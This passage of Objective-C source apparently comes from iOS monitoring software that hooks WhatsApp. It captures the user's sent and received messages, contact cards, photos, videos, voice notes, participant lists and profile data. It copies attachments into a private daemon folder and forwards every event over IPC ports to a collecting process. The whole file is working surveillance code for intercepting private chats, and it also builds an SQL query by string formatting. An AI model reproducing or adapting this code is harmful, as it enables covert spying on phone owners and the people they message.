					[WhatsAppUtils sendAnyContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
												 userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
											   userStatusMessage:myStatus
										  userProfilePictureData:myPhoto
													userLocation:nil
										   messageRepresentation:kIMMessageContact
														 message:vcardString	/*aOutGoingEvent vCardStringValue] --> old implementation*/
													   direction:kEventDirectionOut
												  conversationID:conversationId
												conversationName:conversationName
									  conversationProfilePicture:conversationPhoto
													participants:participants
													 attachments:[NSArray array]
												   shareLocation:nil];		
					
				}
				// -- Text
				else {
					DLog (@">>> WhatsApp outgoing text")
					[WhatsAppUtils sendAnyContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
												 userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
											   userStatusMessage:myStatus
										  userProfilePictureData:myPhoto
													userLocation:nil
										   messageRepresentation:kIMMessageText
														 message:message
													   direction:kEventDirectionOut
												  conversationID:conversationId
												conversationName:conversationName
									  conversationProfilePicture:conversationPhoto
													participants:participants
													 attachments:[NSArray array]
												   shareLocation:nil];
				}
				[conversationId release];
				conversationId = nil;
				[conversationName release];
				conversationName = nil;
		
				
				// -- END sending WhatsApp event ---------------------------------------------------------------				
				DLog(@"XMPPMessageStanza==========> User Name: %@",[mAccountInfo objectForKey:kWhatsAppContactName]);
				DLog(@"XMPPMessageStanza==========> User ID: %@",[mAccountInfo objectForKey:kWhatsAppContactNumber]);
				DLog(@"XMPPMessageStanza==========> Message: %@",message);
				DLog(@"XMPPMessageStanza==========> FXParticipants: %@",participants);
				
				DLog (@"*******************************************************************************************")
				DLog (@"*******************	    OUTGOING WHATSAPP EVENT      *******************");
				DLog (@"*******************************************************************************************")
			}
		}
	} else {
		DLog (@"Duplicate outgoing whatsapp message")
	}
}

#pragma mark -

-(NSString *)getContactStatus:(NSString *)aContactId{
	NSString * status = nil;
	NSArray * dirPaths = NSSearchPathForDirectoriesInDomains( NSDocumentDirectory, NSUserDomainMask, YES);
	NSString * databasePath = [NSString stringWithFormat:@"%@/Contacts.sqlite",[dirPaths objectAtIndex:0]];

	NSFileManager *fileManager = [NSFileManager defaultManager];
	
	if ([fileManager fileExistsAtPath:databasePath]) {
		NSString *sql = nil;
		FMDatabase *db = [FMDatabase databaseWithPath:databasePath];
		[db open];
		
		sql = [NSString stringWithFormat:@"SELECT ZTEXT FROM ZWASTATUS WHERE ZWHATSAPPID =\"%@\"",aContactId];
		FMResultSet * result = [db executeQuery:sql];
		
		if([result next]) {
			
			status = [result stringForColumnIndex:0];
			//DLog(@"****************************** status %@",status);
		}
		[db close];
		
	}
	
	return status;
}

#pragma mark -
#pragma mark --------- Event Sending -----------
#pragma mark


+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		sharedFileSender = [[WhatsAppUtils sharedWhatsAppUtils] mIMSharedFileSender];
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

+ (void) sendWhatsAppEvent: (FxIMEvent *) aIMEvent {
	DLog (@"Queue WhatsApp event %@", aIMEvent)
    
    //Add to que
    NSInvocationOperation *sendingEventoperation = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(operationSendWhatsAppEvent:) object:aIMEvent];
    [[[ WhatsAppUtils sharedWhatsAppUtils] mSendingEventQueue] addOperation:sendingEventoperation];
    [sendingEventoperation release];
}

+ (void) operationSendWhatsAppEvent:(FxIMEvent *)aIMEvent {
    DLog (@"WhatsApp event %@", aIMEvent)
        // -- construct the data
    NSMutableData* data			= [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:aIMEvent forKey:kiMessageArchived];
    [archiver finishEncoding];
    [archiver release];
    
        //MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kWhatsAppMessagePort1];
    BOOL successfully = NO;
    
        // -- load balance
    if (!(successfully = [WhatsAppUtils sendDataToPort:data portName:kWhatsAppMessagePort1])) {		// send to port 1
        DLog (@"First sending WhatsApp fail");
        [NSThread sleepForTimeInterval:2.0];
        successfully = [WhatsAppUtils sendDataToPort:data portName:kWhatsAppMessagePort2];			// send to port 2
        
        if (!successfully) {
            DLog (@"Second sending WhatsApp also fail");
            [self deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
        }		
    } 
    
    [data release];
    data = nil;
}

+ (void) sendAnyContentTypeEventUserID: (NSString *) aUserID						// user id
					   userDisplayName: (NSString *) aUserDisplayName				// user display name
					 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
				userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture
						  userLocation: (FxIMGeoTag *) aUserLocation

				 messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation
							   message: (NSString *) aMessage
							 direction: (FxEventDirection) aDirection				// direction

						conversationID: (NSString *) aConversationID				// conversation id
					  conversationName: (NSString *) aConversationName				// conversation name
			conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

						  participants: (NSArray *) aParticipants														

						   attachments: (NSArray *) aAttachments

						 shareLocation: (FxIMGeoTag *) aSharedLocation {	
	/********************************
	 *			FxIMEvent [ANY]
	 ********************************/
	FxIMEvent *imEvent = [[FxIMEvent alloc] init];
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	
	[imEvent setMIMServiceID:kIMServiceIDWhatsApp];					// specific to IM application	
	[imEvent setMServiceID:kIMServiceWhatsApp];						// specific to IM application	
	
	[imEvent setMDirection:(FxEventDirection) aDirection];
	[imEvent setMRepresentationOfMessage:aMessageRepresentation];
	[imEvent setMMessage:aMessage];				
	// -- user
	[imEvent setMUserID:aUserID];
	[imEvent setMUserDisplayName:aUserDisplayName];
	[imEvent setMUserStatusMessage:aUserStatusMessage];
	[imEvent setMUserPicture:aUserProfilePictureData];
	[imEvent setMUserLocation:aUserLocation];
	// -- conversation
	[imEvent setMConversationID:aConversationID];
	[imEvent setMConversationName:aConversationName];
	[imEvent setMConversationPicture:aConversationProfilePicture];
	// -- participant
	[imEvent setMParticipants:aParticipants];
	// -- attachment
	[imEvent setMAttachments:aAttachments];		
	// -- share location
	[imEvent setMShareLocation:aSharedLocation];	
		
	// -- send WhatsApp event ---------------------------------------------------------------------	
	[WhatsAppUtils sendWhatsAppEvent:imEvent];
	[imEvent release];
	imEvent = nil;
}

+ (void) sendImageContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction
                            imageCaption: (NSString *) aCaption                     // caption

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   photoData: (NSData *) aPhotoData
						   thumbnailData: (NSData *) aThumbnailData {
	/********************************
	 *			FxIMEvent [Image]
	 ********************************/
	NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
	FxAttachment *attachment	= [WhatsAppUtils createPhotoAttachment:aPhotoData thumbnail: aThumbnailData];		
	NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];	
	[pool drain];
	
	DLog (@"aThumbnailData %lu", (unsigned long)[aThumbnailData length])
    
    FxIMMessageRepresentation respOfMessage = kIMMessageNone;
    if ([aCaption length]) {
        respOfMessage |= kIMMessageText;
    }
			
	[WhatsAppUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:respOfMessage
										 message:aCaption										// No message for image
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];					// one photo as an attachment
	[attachments release];
	attachments = nil;		
}


+ (void) sendVideoContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction
                            videoCaption: (NSString *) aCaption                     // caption

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants	
							   videoPath: (NSURL *) aVideoPath 
						   thumbnailData: (NSData *) aThumbnailData {
	/********************************
	 *			FxIMEvent [Video]
	 ********************************/
    NSData *videoData		= nil;
    
    if (aVideoPath) {
        // file://localhost/var/mobile/Applications/D7A1B885-11BC-48F9-8A25-C1B15CAA417F/Library/Media/66824958383@s.whatsapp.net/c/2/c26a9b5635d67eb7fc9a915a491fd4da.MOV
        DLog (@"aVideoPath %@", aVideoPath)		
        DLog (@"Video file exist: %d", [[NSFileManager defaultManager] fileExistsAtPath:[aVideoPath path]])
        
        videoData				= [[NSData alloc] initWithContentsOfURL:aVideoPath];
    }	

    
    DLog (@">>> video Data length %lu", (unsigned long)[videoData length])
    
    FxAttachment *attachment	= [WhatsAppUtils createVideoAttachmentForData:videoData 
                                                                thumbnailData:aThumbnailData
                                                                fileExtension:@"MOV"];
    [videoData release];
    videoData = nil;
    
    NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
    
    FxIMMessageRepresentation respOfMessage = kIMMessageNone;
    if ([aCaption length]) {
        respOfMessage |= kIMMessageText;
    }
    
    [WhatsAppUtils sendAnyContentTypeEventUserID:aUserID
                                 userDisplayName:aUserDisplayName 
                               userStatusMessage:aUserStatusMessage
                          userProfilePictureData:aUserProfilePictureData 
                                    userLocation:nil 
                           messageRepresentation:respOfMessage
                                         message:aCaption										// No message for video
                                       direction:aDirection 
                                  conversationID:aConversationID 
                                conversationName:aConversationName 
                      conversationProfilePicture:aConversationProfilePicture 
                                    participants:aParticipants 
                                     attachments:attachments
                                   shareLocation:nil];
    [attachments release];
}

// -- create a new thread to download and send video attachment
+ (void) send2VideoContentTypeEventUserID: (NSString *) aUserID						// user id
						  userDisplayName: (NSString *) aUserDisplayName				// user display name
						userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				   userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

								direction: (FxEventDirection) aDirection				// direction
                             videoCaption: (NSString *) aCaption                    // caption

						   conversationID: (NSString *) aConversationID				// conversation id
						 conversationName: (NSString *) aConversationName			// conversation name
			   conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							 participants: (NSArray *) aParticipants	
								videoPath: (NSURL *) aVideoPath 
							thumbnailData: (NSData *) aThumbnailData {	
	DLog (@"====== VIDEO: constructing dictionary of WhatsApp info =====")
	
	NSMutableDictionary *whatsAppInfo = [[NSMutableDictionary alloc] initWithObjectsAndKeys:aUserID, kWhatsAppUserIdKey, nil];
	if (aUserDisplayName)			[whatsAppInfo setObject:aUserDisplayName forKey:kWhatsAppUserDisplayNameKey];			
	if (aUserStatusMessage)			[whatsAppInfo setObject:aUserStatusMessage forKey:kWhatsAppUserStatusMessageKey];
	if (aUserProfilePictureData)	[whatsAppInfo setObject:aUserProfilePictureData forKey:kWhatsAppSenderImageProfileDataKey];			
	[whatsAppInfo setObject:[NSNumber numberWithInt:aDirection] forKey:kWhatsAppDirectionKey];
    if (aCaption) [whatsAppInfo setObject:aCaption forKey:kWhatsAppCaptionKey];
	if (aConversationID)			[whatsAppInfo setObject:aConversationID forKey:kWhatsAppConversationIDKey];
	if (aConversationName)			[whatsAppInfo setObject:aConversationName forKey:kWhatsAppConversationNameKey];						
	if (aConversationProfilePicture)	[whatsAppInfo setObject:aConversationProfilePicture forKey:kWhatsAppConversationProfilePicDataKey];
	if (aParticipants)				[whatsAppInfo setObject:aParticipants forKey:kWhatsAppParticipantsKey];
	if (aVideoPath)					[whatsAppInfo setObject:aVideoPath forKey:kWhatsAppVideoPathKey];		
	if (aThumbnailData)				[whatsAppInfo setObject:aThumbnailData forKey:kWhatsAppVideoThumbnailData];
	DLog (@"--->>>>> whatsApp Info %@", whatsAppInfo)
	
	[NSThread detachNewThreadSelector:@selector(sendWhatsAppVideoInfo:) 
							 toTarget:[WhatsAppUtils class]
						   withObject:whatsAppInfo];
	[whatsAppInfo release];	
}

+ (void) sendAudioContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants	
							   audioPath: (NSURL *) aAudioPath {
		
	/********************************
	 *			FxIMEvent [Audio]
	 ********************************/
	NSData *audioData		= nil;
	DLog (@"aAudioPath url %@ abs string %@ schema %@", aAudioPath, [aAudioPath absoluteString], [aAudioPath scheme])
	
    if (![aAudioPath scheme]) 
		audioData				= [[NSData alloc] initWithContentsOfFile:[aAudioPath absoluteString]];	// for local path (outgoing)
	else
		audioData				= [[NSData alloc] initWithContentsOfURL:aAudioPath];					// for remote path (incoming)	
	DLog (@">>> audio Data length %lu", (unsigned long)[audioData length])
		
	FxAttachment *attachment	= [WhatsAppUtils createAudioAttachmentForData:audioData	fileExtension:[[aAudioPath absoluteString] pathExtension]];
	
	[audioData release];
	audioData = nil;
	
	NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];	
			
	[WhatsAppUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageNone								
										 message:nil										// No message for audio
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];
	[attachments release];		
}

// -- create a new thread to download and send audio attachment
+ (void) send2AudioContentTypeEventUserID: (NSString *) aUserID						// user id
						  userDisplayName: (NSString *) aUserDisplayName				// user display name
						userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				   userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

								direction: (FxEventDirection) aDirection				// direction

						   conversationID: (NSString *) aConversationID				// conversation id
						 conversationName: (NSString *) aConversationName			// conversation name
			   conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							 participants: (NSArray *) aParticipants	
								audioPath: (NSURL *) aAudioPath {
	
	
	DLog (@"====== AUDIO: constructing dictionary of WhatsApp info =====")
	
	NSMutableDictionary *whatsAppInfo = [[NSMutableDictionary alloc] initWithObjectsAndKeys:aUserID, kWhatsAppUserIdKey, nil];
	if (aUserDisplayName)			[whatsAppInfo setObject:aUserDisplayName forKey:kWhatsAppUserDisplayNameKey];			
	if (aUserStatusMessage)			[whatsAppInfo setObject:aUserStatusMessage forKey:kWhatsAppUserStatusMessageKey];
	if (aUserProfilePictureData)	[whatsAppInfo setObject:aUserProfilePictureData forKey:kWhatsAppSenderImageProfileDataKey];			
	[whatsAppInfo setObject:[NSNumber numberWithInt:aDirection] forKey:kWhatsAppDirectionKey];			
	if (aConversationID)			[whatsAppInfo setObject:aConversationID forKey:kWhatsAppConversationIDKey];
	if (aConversationName)			[whatsAppInfo setObject:aConversationName forKey:kWhatsAppConversationNameKey];						
	if (aConversationProfilePicture)	[whatsAppInfo setObject:aConversationProfilePicture forKey:kWhatsAppConversationProfilePicDataKey];
	if (aParticipants)				[whatsAppInfo setObject:aParticipants forKey:kWhatsAppParticipantsKey];
	if (aAudioPath)					[whatsAppInfo setObject:aAudioPath forKey:kWhatsAppAudioPathKey];		
	
	DLog (@"--->>>>> whatsApp Info %@", whatsAppInfo)
	
	[NSThread detachNewThreadSelector:@selector(sendWhatsAppAudioInfo:) 
							 toTarget:[WhatsAppUtils class]
						   withObject:whatsAppInfo];
	[whatsAppInfo release];	
}


+ (void) sendWhatsAppVideoInfo: (NSDictionary *) aWhatsAppInfo {
	NSString *userId					= [aWhatsAppInfo objectForKey:kWhatsAppUserIdKey];
	NSString *userDisplayName			= [aWhatsAppInfo objectForKey:kWhatsAppUserDisplayNameKey];
	NSString *userStatusMessage			= [aWhatsAppInfo objectForKey:kWhatsAppUserStatusMessageKey];
	NSData *senderImageProfileData		= [aWhatsAppInfo objectForKey:kWhatsAppSenderImageProfileDataKey];
	FxEventDirection direction			=  (FxEventDirection) [[aWhatsAppInfo objectForKey:kWhatsAppDirectionKey] intValue];
    NSString *caption                   = [aWhatsAppInfo objectForKey:kWhatsAppCaptionKey];
	NSString *conversationID			= [aWhatsAppInfo objectForKey:kWhatsAppConversationIDKey];
	NSString *conversationName			= [aWhatsAppInfo objectForKey:kWhatsAppConversationNameKey];
	NSData *conversationProfilePicData	= [aWhatsAppInfo objectForKey:kWhatsAppConversationProfilePicDataKey];
	NSArray *participants				= [aWhatsAppInfo objectForKey:kWhatsAppParticipantsKey];
	NSURL *videoPath					= [aWhatsAppInfo objectForKey:kWhatsAppVideoPathKey];
	NSData *videoThumbnailData			= [aWhatsAppInfo objectForKey:kWhatsAppVideoThumbnailData];
	
	//[NSThread sleepForTimeInterval:kAudioDownloadDelay];
	
	DLog (@"!!!!!!!!!!!!!! send whatsapp VIDEO !!!!!!!!!!!")
	[WhatsAppUtils sendVideoContentTypeEventUserID:userId
								   userDisplayName:userDisplayName
								 userStatusMessage:userStatusMessage
							userProfilePictureData:senderImageProfileData
										 direction:direction
                                      videoCaption:caption
									conversationID:conversationID
								  conversationName:conversationName
						conversationProfilePicture:conversationProfilePicData
									  participants:participants
										 videoPath:videoPath
									 thumbnailData:videoThumbnailData];
}


+ (void) sendWhatsAppAudioInfo: (NSDictionary *) aWhatsAppInfo {
	NSString *userId					= [aWhatsAppInfo objectForKey:kWhatsAppUserIdKey];
	NSString *userDisplayName			= [aWhatsAppInfo objectForKey:kWhatsAppUserDisplayNameKey];
	NSString *userStatusMessage			= [aWhatsAppInfo objectForKey:kWhatsAppUserStatusMessageKey];
	NSData *senderImageProfileData		= [aWhatsAppInfo objectForKey:kWhatsAppSenderImageProfileDataKey];
	FxEventDirection direction			=  (FxEventDirection) [[aWhatsAppInfo objectForKey:kWhatsAppDirectionKey] intValue];
	NSString *conversationID			= [aWhatsAppInfo objectForKey:kWhatsAppConversationIDKey];
	NSString *conversationName			= [aWhatsAppInfo objectForKey:kWhatsAppConversationNameKey];
	NSData *conversationProfilePicData	= [aWhatsAppInfo objectForKey:kWhatsAppConversationProfilePicDataKey];
	NSArray *participants				= [aWhatsAppInfo objectForKey:kWhatsAppParticipantsKey];
	NSURL *audioPath					= [aWhatsAppInfo objectForKey:kWhatsAppAudioPathKey];
	
	//[NSThread sleepForTimeInterval:kAudioDownloadDelay];
	
	DLog (@"!!!!!!!!!!!!!! send whatsapp AUDIO !!!!!!!!!!!")
	[WhatsAppUtils sendAudioContentTypeEventUserID:userId
								   userDisplayName:userDisplayName
								 userStatusMessage:userStatusMessage
							userProfilePictureData:senderImageProfileData
										 direction:direction
									conversationID:conversationID
								  conversationName:conversationName
						conversationProfilePicture:conversationProfilePicData
									  participants:participants	
										 audioPath:audioPath];

}


#pragma mark -
#pragma mark --------- Attachment -----------
#pragma mark 

#pragma mark Photo Attachment Utils


+ (FxAttachment *) createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData {
	// -- create path
	NSString* whatsAppAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imWhatsApp/"];
	whatsAppAttachmentPath				= [WhatsAppUtils getOutputPath:whatsAppAttachmentPath extension:@"jpg"];
	DLog (@"attachment %@", whatsAppAttachmentPath)
	
	// -- write image to document file
	if (aImageData) {
        if (![aImageData writeToFile:whatsAppAttachmentPath atomically:YES]) {
            // iOS 9, Sandbox
            whatsAppAttachmentPath = [IMShareUtils saveData:aImageData
                                     toDocumentSubDirectory:@"/attachments/imWhatsApp/"
                                                   fileName:[whatsAppAttachmentPath lastPathComponent]];
            DLog(@"New photo whatsAppAttachmentPath, %@", whatsAppAttachmentPath);
        }
	}
	
	// -- create FxAttachment
	FxAttachment *attachment = [[FxAttachment alloc] init];
	if (aImageData)
		[attachment setFullPath:whatsAppAttachmentPath];
	else {
		[attachment setFullPath:@"image/jpeg"];			// can not get actual image in time
	}
	[attachment setMThumbnail:aThumbnailData];			// even actual image hasn't been downloaded, its thumbnail has been created
	
	return [attachment autorelease];
}


#pragma mark Video Attachment Utils


+ (FxAttachment *) createVideoAttachmentForData: (NSData *) aData 
								  thumbnailData: (NSData *) aThumbnailData
								  fileExtension: (NSString *) aExtension  {
	// -- create path
	NSString* whatsAppAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imWhatsApp/"];
	whatsAppAttachmentPath				= [WhatsAppUtils getOutputPath:whatsAppAttachmentPath extension:aExtension];	
	DLog (@"WhatsApp video attachment %@", whatsAppAttachmentPath)
	
	// -- create FxAttachment
	FxAttachment *attachment			= [[FxAttachment alloc] init];
	[attachment setMThumbnail:aThumbnailData];
	
	// -- write video to document file
	if (aData) {
        if (![aData writeToFile:whatsAppAttachmentPath atomically:YES]) {
            // iOS 9, Sandbox
            whatsAppAttachmentPath = [IMShareUtils saveData:aData
                                     toDocumentSubDirectory:@"/attachments/imWhatsApp/"
                                                   fileName:[whatsAppAttachmentPath lastPathComponent]];
            DLog(@"New video whatsAppAttachmentPath, %@", whatsAppAttachmentPath);
        }
		[attachment setFullPath:whatsAppAttachmentPath];
	} else {
		[attachment setFullPath:@"video/MOV"];							// cannot capture incoming video				
	}
	
	return [attachment autorelease];
}


#pragma mark Audio Attachment Utils


+ (FxAttachment *) createAudioAttachmentForData: (NSData *) aData
								  fileExtension: (NSString *) aExtension {
	// -- create path
	NSString* whatsAppAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imWhatsApp/"];
	whatsAppAttachmentPath				= [WhatsAppUtils getOutputPath:whatsAppAttachmentPath extension:aExtension];	
	DLog (@"attachment %@", whatsAppAttachmentPath)
	
	// -- create FxAttachment
	FxAttachment *attachment			= [[FxAttachment alloc] init];
	
	// -- write audio to document file
	if (aData) {
        if (![aData writeToFile:whatsAppAttachmentPath atomically:YES]) {
            // iOS 9, Sandbox
            whatsAppAttachmentPath = [IMShareUtils saveData:aData
                                     toDocumentSubDirectory:@"/attachments/imWhatsApp/"
                                                   fileName:[whatsAppAttachmentPath lastPathComponent]];
            DLog(@"New audio whatsAppAttachmentPath, %@", whatsAppAttachmentPath);
        }
		[attachment setFullPath:whatsAppAttachmentPath];
	} else {
		[attachment setFullPath:@"audio/caf"];							// cannot capture incoming video				
	}
	
	return [attachment autorelease];
}


#pragma mark Attachment Utils


// create timestamp of now
+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

// get thumbnail path with its extension
+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@im_%@.%@",
							aOutputPathWithoutExtension, 
							formattedDateString, 
							aExtension];
	return [outputPath autorelease];
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
	// delete the attachment files
	if (aAttachmentArray && [aAttachmentArray count] != 0) {
		for (FxAttachment *attachment in aAttachmentArray) {
			NSString *path = [attachment fullPath];
			DLog (@"deleting file: %@", path)
			[[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		}	
	}
}



#pragma mark -
#pragma mark Memory Management


/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
 */

- (void) dealloc {
	if(mWhatsAppDB) {
		[mWhatsAppDB close];
		[mWhatsAppDB release];
		mWhatsAppDB = nil;
	}
    
    [self.mSendingEventQueue release];
    self.mSendingEventQueue = nil;
    
	if (mAccountInfo) {
		[mAccountInfo release];
		mAccountInfo = nil;
	}
	[mIMSharedFileSender release];
	[super dealloc];	
}


/* 
 This method is called from WhatsAppOP. The operation will call this on the original thread.
 */
//- (void) createOutgoingWhatsAppEventWithDelay: (NSDictionary *) aArguments {
//	
//	DLog(@"-- createOutgoingWhatsAppEventWithDelay --")
//	id outgoingEvent = [aArguments objectForKey:kWhatsAppOPArgMessage];	
//	[self createOutgoingWhatsAppEvent:outgoingEvent];
//	
//}


@end
